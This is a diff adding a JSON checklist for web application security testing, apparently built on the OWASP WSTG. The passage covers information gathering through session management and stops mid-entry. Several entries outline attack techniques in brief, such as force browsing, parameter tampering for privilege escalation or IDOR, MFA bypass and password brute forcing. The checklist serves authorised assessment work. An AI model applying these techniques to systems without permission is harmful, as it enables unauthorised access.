@@ -1,0 +1,613 @@
+{
+  "targets": [],
+  "libraries": [
+    {
+      "id": "6c749b35-ac52-4328-b8b8-8e674df195ac",
+      "title": "OWASP Testing Checklist",
+      "folders": [
+        {
+          "id": "20669fa4-d338-404c-b1e2-66a83068ddee",
+          "title": "1. Information Gathering",
+          "checklist": [
+            {
+              "id": "c9340af6-500c-4a5c-b2c4-37c1482ace0e",
+              "title": "Conduct Search Engine Discovery Reconnaissance for Information Leakage",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services). <br> <br></p>\n                <p><strong>Tools:</strong> Google Hacking<br>Shodan<br>Recon-ng <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "5ad88a0f-551d-4142-a10d-4e1e7d426d0f",
+              "title": "Fingerprint Web Server",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities. <br> <br></p>\n                <p><strong>Tools:</strong> Wappalyzer<br>Nikto <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br>A6<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "4e49c3ea-3718-4586-a30c-174d605af723",
+              "title": "Review Webserver Metafiles for Information Leakage",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <META> tag, sitemap.xml)<br>- Extract and map other information that could lead to a better understanding of the systems at hand. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Curl<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "494938e6-4a47-4c9b-9cdb-39317c9771ba",
+              "title": "Enumerate Applications on Webserver",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Enumerate the applications within the scope that exist on a web server.<br>- Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers <br> <br></p>\n                <p><strong>Tools:</strong> dnsrecon<br>Nmap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "e7c8e2c8-a38a-4acd-9fe0-13b0ec69e1b4",
+              "title": "Review Webpage Content for Information Leakage",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review webpage comments, metadata, and redirect bodies to find any information leakage.<br>- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.<br>- Identify if source map files or other front-end debug files exist. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Curl<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "3b894d44-6591-49c8-aefc-bd370e995972",
+              "title": "Identify Application Entry Points",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis <br> <br></p>\n                <p><strong>Tools:</strong> OWASP ASD<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "4878933d-53f1-4a66-b667-ecec8aa6f7b3",
+              "title": "Map Execution Paths Through Application",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Map the target application and understand the principal workflows.<br>- Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "b72acd39-1f22-4cdd-bd86-3c9c81419cb4",
+              "title": "Fingerprint Web Application Framework",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Fingerprint the components being used by the web applications.<br>- Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message. <br> <br></p>\n                <p><strong>Tools:</strong> Whatweb<br>Wappalyzer<br>CMSMap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br>A6<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "9919c9b9-0454-4179-830e-06dcdc596797",
+              "title": "Fingerprint Web Application",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-09 <br><br> </p>\n                <p><strong>Objectives:</strong> N/A, This content has been merged into: WSTG-INFO-08 <br> <br></p>\n                <p><strong>Tools:</strong> NA <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "e1c82d08-597c-4db0-b563-0fdcf542dafe",
+              "title": "Map Application Architecture",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INFO-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Understand the architecture of the application and the technologies in use.<br>- Identify application architecture whether on Application and Network components:<br>Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs<br>Network and Security: Reverse proxy, IPS, WAF <br> <br></p>\n                <p><strong>Tools:</strong> WAFW00F<br>Nmap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "dde56941-dcc0-43de-8906-898472ee83e4",
+          "title": "2. Configuration and Deploy Management Testing",
+          "checklist": [
+            {
+              "id": "7e301d3d-ca54-47a0-b957-d8c69f9a37c4",
+              "title": "Test Network Infrastructure Configuration",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the applications' configurations set across the network and validate that they are not vulnerable.<br>- Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials. <br> <br></p>\n                <p><strong>Tools:</strong> Nessus<br>Nmap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A5<br>A6<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "eb114e75-060b-4e8f-9ada-c86622ddecd2",
+              "title": "Test Application Platform Configuration",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Ensure that defaults and known files have been removed.<br>- Review configuration and server handling (40*, 50*)<br>- Validate that no debugging code or extensions are left in the production environments.<br>- Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Nikto<br>CIS Benchmarks <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A5<br>A9<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "d419ab60-92bf-48c3-a940-824d56b943db",
+              "title": "Test File Extensions Handling for Sensitive Information",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Dirbust sensitive file extensions, or extensions that might contain raw data (*e.g.* scripts, raw data, credentials, etc.).<br>- Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)<br>- Validate that no system framework bypasses exist on the rules set. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Nikto<br>DirSearch<br>ffuf <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "6a88918d-1f0b-4433-b151-1eb0cc73cb97",
+              "title": "Review Old Backup and Unreferenced Files for Sensitive Information",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Find and analyse unreferenced files that might contain sensitive information.<br>- Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Nikto<br>DirSearch<br>ffuf <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "c014f299-bd7f-4754-a080-5f990f838d3b",
+              "title": "Enumerate Infrastructure and Application Admin Interfaces",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify hidden administrator interfaces and functionality.<br>- Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>DirSearch<br>ffuf <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2a56097c-1747-44fe-90a5-70de0b713c80",
+              "title": "Test HTTP Methods",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Enumerate supported HTTP methods using OPTIONS<br>- Test for access control bypass (GET->HEAD->FOO)<br>- Test HTTP method overriding techniques. <br> <br></p>\n                <p><strong>Tools:</strong> netcat<br>curl <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "256f975c-fef4-42a6-b601-ba8f2c6bd03c",
+              "title": "Test HTTP Strict Transport Security",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the HSTS header and its validity.<br>- Identify HSTS header on Web server through HTTP response header:<br>curl -s -D- https://domain.com/ | grep Strict <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>curl <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "28156105-96d1-43bf-aafd-964e6a52faad",
+              "title": "Test RIA Cross Domain Policy",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-08 <br><br> </p>\n                <p><strong>Objectives:</strong> Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>curl <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "787e1924-ea56-4c0e-8860-e7391abef961",
+              "title": "Test File Permission",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review and Identify any rogue file permissions.<br>- Identify configuration file whose permissions are set to world-readable from the installation by default. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Nikto <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "735300fa-6220-4059-9946-1674e433be63",
+              "title": "Test for Subdomain Takeover",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Enumerate all possible domains (previous and current).<br>- Identify forgotten or misconfigured domains. <br> <br></p>\n                <p><strong>Tools:</strong> Dnsrecon <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "60623f3a-2ec4-41d6-b2f9-3b1a8f808762",
+              "title": "Test Cloud Storage",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-11 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess that the access control configuration for the storage services is properly in place. <br> <br></p>\n                <p><strong>Tools:</strong> AWS CLI<br>S3Scanner <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8ac7c8fd-34ca-41d9-b1eb-4a26a2a60c84",
+              "title": "Testing for Content Security Policy",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-12 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the Content-Security-Policy header or meta element to identify misconfigurations. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite CSP Auditor <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "42d6796b-1f36-4a74-acc9-cd8bd42ef51e",
+              "title": "Test Path Confusion",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CONF-13 <br><br> </p>\n                <p><strong>Objectives:</strong> - Make sure application paths are configured correctly. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "15516824-9602-4515-a88f-7381fdae2f11",
+          "title": "3. Identity Management Testing",
+          "checklist": [
+            {
+              "id": "770ad6e0-bfe4-421c-966a-5b33d832d606",
+              "title": "Test Role Definitions",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-IDNT-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify and document roles used by the application.<br>- Attempt to switch, change, or access another role.<br>- Review the granularity of the roles and the needs behind the permissions given. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8c23f7f8-cef5-461a-93f1-5812c4bc543d",
+              "title": "Test User Registration Process",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-IDNT-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Verify that the identity requirements for user registration are aligned with business and security requirements.<br>- Validate the registration process. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "95402440-e59c-41e2-be04-6c3f4e41181b",
+              "title": "Test Account Provisioning Process",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-IDNT-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Verify which accounts may provision other accounts and of what type. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2afe6b2a-90b3-4665-98a8-7053505e4aba",
+              "title": "Testing for Account Enumeration and Guessable User Account",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-IDNT-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review processes that pertain to user identification (*e.g.* registration, login, etc.).<br>- Enumerate users where possible through response analysis. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "955fc1a7-39af-4483-8aaf-24ec65c0259a",
+              "title": "Testing for Weak or Unenforced Username Policy",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-IDNT-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether a consistent account name structure renders the application vulnerable to account enumeration.<br>- User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.<br>- Determine whether the application's error messages permit account enumeration. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "2c3f1847-1938-437e-acc5-e6360241726b",
+          "title": "4. Authentication Testing",
+          "checklist": [
+            {
+              "id": "a1c96887-2ec9-415a-8bcc-5f6d35defc00",
+              "title": "Testing for Credentials Transported over an Encrypted Channel",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-01 <br><br> </p>\n                <p><strong>Objectives:</strong> N/A, This content has been merged into: WSTG-CRYP-03 <br> <br></p>\n                <p><strong>Tools:</strong> NA <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "9485d47b-8b61-46ee-8b31-9ce336710660",
+              "title": "Testing for Default Credentials",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether the application has any User accounts with default passwords. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP<br>Hydra <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "27012540-4cdd-4ff2-8dbd-5f308e408b69",
+              "title": "Testing for Weak Lock Out Mechanism",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.<br>- Evaluate the unlock mechanism's resistance to unauthorized account unlocking. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP<br>Hydra <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "d8f8dfb3-b2a3-4e2e-96bc-a450fa94de1f",
+              "title": "Testing for Bypassing Authentication Schema",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Ensure that authentication is applied across all services that require it.<br>- Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "4bf6f09b-93e8-401d-9e04-9472bac3aed4",
+              "title": "Testing for Vulnerable Remember Password",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Validate that the generated session is managed securely and do not put the user's credentials in danger  (e.g., cookie)<br>- Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off? <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br>A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "72355135-6324-40e4-a2aa-11c6885a726c",
+              "title": "Testing for Browser Cache Weaknesses",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review if the application stores sensitive information on the client-side.<br>- Review if access can occur without authorization.<br>- Check browser history issue by clicking \"Back\" button after logging out.<br>- Check browser cache issue from HTTP response headers (Cache-Control: no-cache) <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2bf206ca-f534-4a1b-bb23-a2fce5723532",
+              "title": "Testing for Weak Password Policy",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.<br>- Review whether new User accounts are created with weak or predictable passwords. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Hydra <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "201ea688-a005-4502-840c-d2551610b287",
+              "title": "Testing for Weak Security Question Answer",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)<br>- Assess possible user answers and brute force capabilities. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "05a296a9-c5e6-4857-8952-dd6ef403104a",
+              "title": "Testing for Weak Password Change or Reset Functionalities",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether the password change and reset functionality allows accounts to be compromised.<br>- Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)<br>- Test password change (Need old password?) <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "9eaf94a4-5b04-40e6-aa0b-2080bfe08bcc",
+              "title": "Testing for Weaker Authentication in Alternative Channel",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify alternative authentication channels.<br>- Assess the security measures used and if any bypasses exists on the alternative channels. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "eb4ad792-08f9-426a-83c8-33f484e0dc1d",
+              "title": "Testing Multi-Factor Authentication (MFA)",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHN-11 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify the type of MFA used by the application.<br>- Determine whether the MFA implementation is robust and secure.<br>- Attempt to bypass the MFA. <br> <br></p>\n                <p><strong>Tools:</strong> Browser<br>Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "d7b80d94-45bb-4257-864e-366910de7d01",
+          "title": "5. Authorization Testing",
+          "checklist": [
+            {
+              "id": "709257a4-c647-404d-aec9-d502d6788454",
+              "title": "Testing Directory Traversal File Include",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHZ-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify injection points that pertain to path traversal.<br>- Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "0ac47158-5abd-4994-b820-8923df80194b",
+              "title": "Testing for Bypassing Authorization Schema",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHZ-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess if horizontal or vertical access is possible.<br>- Access to Administrative functions by force browsing (/admin/addUser) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "028d7c77-d8b1-4520-af94-1307af88c5a7",
+              "title": "Testing for Privilege Escalation",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHZ-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1<br>- Verify that it is not possible for a user to modify their privileges or roles inside the application<br>- Fuzz or otherwise attempt to bypass security measures. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "35dca5bb-8263-4bf9-9804-64afd9a2bf3e",
+              "title": "Testing for Insecure Direct Object References",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHZ-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify points where object references may occur.<br>- Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -> ?invoice=456) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8dcc3f58-db87-4821-a4a9-60dfbfe0cb79",
+              "title": "Testing for OAuth Weaknesses",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ATHZ-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "969ee647-7d97-4a66-876a-4801b74501f5",
+          "title": "6. Session Management Testing",
+          "checklist": [
+            {
+              "id": "17d46a5b-257b-40fb-8a3b-d6c64c444472",
+              "title": "Testing for Session Management Schema",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Gather session tokens, for the same user and for different users where possible.<br>- Analyze and ensure that enough randomness exists to stop session forging attacks.<br>- Modify cookies that are not signed and contain information that can be manipulated. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br>A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8ece7b59-1f14-4930-bc5d-743a8846edfa",
+              "title": "Testing for Cookies Attributes",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "7242f4fe-0bd7-4487-b234-dd3910ac28be",
+              "title": "Testing for Session Fixation",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Analyze the authentication mechanism and its flow.<br>- Force cookies and assess the impact.<br>- Check whether the application renew the cookie after a successfully user authentication. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "161eff7b-d6cd-4937-b13e-7eb930b92950",
+              "title": "Testing for Exposed Session Variables",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Ensure that proper encryption is implemented (Encryption & Reuse of session Tokens vulnerabilities).<br>- Review the caching configuration.<br>- Assess the channel and methods' security (Send sessionID with GET method ?) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "fd07cd37-910c-4997-9290-34bc757bd21a",
+              "title": "Testing for Cross Site Request Forgery",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.<br>- Conduct URL analysis, Direct access to functions without any token. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "e7859f9e-ca5e-443c-bfa2-599821afc028",
+              "title": "Testing for Logout Functionality",
